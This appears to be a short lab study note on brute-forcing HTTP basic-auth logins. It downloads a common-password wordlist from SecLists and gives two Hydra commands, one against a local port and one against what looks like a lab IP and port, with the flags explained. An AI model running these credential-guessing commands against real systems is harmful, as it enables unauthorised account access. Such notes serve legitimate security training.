
This works when the target is using HTTP auth and not web form

## Example 1

![[Pasted image 20251112004225.png]]

```bash
# Download wordlist if needed
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt


# Hydra command
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

-l: Single username
-P: Password Wordlist
/: run it on the websites root path
-s: Specy the port number
```

## Demo 2

```shell
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -O passwords.txt

hydra -L usernames.txt -P passwords.txt -f 94.237.61.248 -s 54019 http-get / -V
```
